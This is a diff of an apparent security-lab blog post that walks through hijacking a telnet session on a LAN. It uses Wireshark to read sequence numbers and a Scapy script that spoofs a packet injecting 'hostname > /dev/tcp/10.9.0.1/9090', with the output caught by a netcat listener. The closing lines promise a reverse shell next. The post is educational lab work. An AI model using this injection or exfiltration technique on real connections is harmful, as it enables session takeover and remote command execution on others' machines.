@@ -30,33 +30,44 @@ The set up is the same as the [previous post](/posts/2023/04/tcp/reset).
  
 # Hijacking a telnet Connection
 
-For this demonstration, I will show how an attacker on the same LAN as two machines that have an existing telnet connection can disrupt the connection by spoofing a properly constructed packet.
+Following these steps will hijack a TCP connection between User 1 as the client and User 2 as the server. We will have the server execute an arbitrary command on our behalf.
 
 I first use `telnet` to connect from User 1 to User 2.
 
 Then, I open Wireshark and monitor the LAN interface. I select the bridge interface starting with "br-". The characters following may change if you stop and start the containers in a separate occurrence.
 
 <figure>
-  <img src="/images/2023-04-26-tcp-reset/wireshark-init.png" alt="Wireshark Init Page">
+  <img src="/images/2023-04-30-tcp-hijacking/wireshark-init.png" alt="Wireshark Init Page">
   <figcaption>Select the bridge interface.</figcaption>
 </figure>
 
 
-In the `telnet` connection, I run a command like `echo hello` to generate some traffic over the `telnet` connection. 
+Logging in to the `telnet` server (Remember: User 2) from the client generates network traffic that we will use to construct the hijack packet. 
 
 <figure>
-  <img src="/images/2023-04-26-tcp-reset/telnet-init.png" alt="A telnet connection">
-  <figcaption>The existing telnet connection with a command executed.</figcaption>
+  <img src="/images/2023-04-30-tcp-hijacking/telnet-init.png" alt="A telnet connection">
+  <figcaption>The telnet connection.</figcaption>
 </figure>
 
-The last TCP packet sent from User 1 to User 2 will inform the source port number and sequence number used in the RST packet we will spoof from the attacker.
+The last TCP packet sent from User 1 to User 2 will inform the source port, sequence, and acknowledgement numbers used in the hijack packet we will spoof from the attacker to the server.
 
 <figure>
-  <img src="/images/2023-04-26-tcp-reset/wireshark.png" alt="Wireshark screen capture">
-  <figcaption>Using Wireshark to construct our RST packet.</figcaption>
+  <img src="/images/2023-04-30-tcp-hijacking/wireshark-data.png" alt="Wireshark screen capture">
+  <figcaption>Using Wireshark to construct our hijack packet.</figcaption>
 </figure>
 
-The following code will send our RST packet:
+
+## Brief: netcat
+
+In order to see the output of the command, we will set up a TCP server using `netcat`. 
+
+<figure>
+  <img src="/images/2023-04-30-tcp-hijacking/netcat-init.png" alt="netcat screen capture">
+  <figcaption>Setting up a TCP server using netcat to see the output of our hijack attack.</figcaption>
+</figure>
+
+
+The following code will send our hijack packet:
 
 ```python
 import argparse
@@ -71,7 +82,7 @@ def spoof_hijack_packet(src_port, seq_num, ack_num):
 
 	ip = IP(src=user1_ip, dst=user2_ip)
 	tcp = TCP(sport=user1_port, dport=user2_port, flags="A", seq=seq_num, ack=ack_num)
-	data = "\r whoami > /dev/tcp/10.9.0.1/9090 \r"
+	data = "\r hostname > /dev/tcp/10.9.0.1/9090 \r"
 
 	pkt = ip/tcp/data
 
@@ -92,11 +103,26 @@ if __name__ == "__main__":
 For convenience, I designed the program to take the source port number, sequence number, and acknowledgement numbers as arguments. I invoke it as follows with the data gathered from Wireshark.
 
 <figure>
-  <img src="/images/2023-04-26-tcp-reset/reset-attack.png" alt="Program invocation">
+  <img src="/images/2023-04-30-tcp-hijacking/python-attack.png" alt="Program invocation">
   <figcaption>Running the attack program with arguments for source port and sequence number.</figcaption>
 </figure>
 
-When we go back to the `telnet` connection, we see that the connection was disconnected.
+
+The `netcat` TCP server we established on port 9090 displays the output from the `hostname` command run on the server. 
+
+<figure>
+  <img src="/images/2023-04-30-tcp-hijacking/netcat-after.png" alt="netcat screen capture">
+  <figcaption>The TCP server displays the hostname of the server.</figcaption>
+</figure>
+
+Which we can verify matches User 2's hostname. 
+
+<figure>
+  <img src="/images/2023-04-30-tcp-hijacking/hostname.png" alt="terminal screen capture">
+  <figcaption>Hostname of the telnet server, User 2</figcaption>
+</figure>
+
+If you were to go back to the `telnet` connection, we see that the connection no longer takes input. This is because the machines have detected the funny business from our spoofed packet.
 
 <figure>
   <img src="/images/2023-04-26-tcp-reset/reset-connection.png" alt="Broken telnet connection">
@@ -106,6 +132,6 @@ When we go back to the `telnet` connection, we see that the connection was disco
 
 # That's it!
 
-In this post, we learned about some of the security vulnerabilities of in TCP.
+We explored the TCP protocol in greater depth, hijacking a TCP connection between two users on the same LAN as the attacker and executing an arbitrary command.
 
-In the next part, we will expand on the knowledge gained from conducting the RST attack to hijack the `telnet` connection to run an arbitrary command.
+In the final installment of this series, we will go a step further and execute a reverse shell using the TCP hijacking technique presented here.
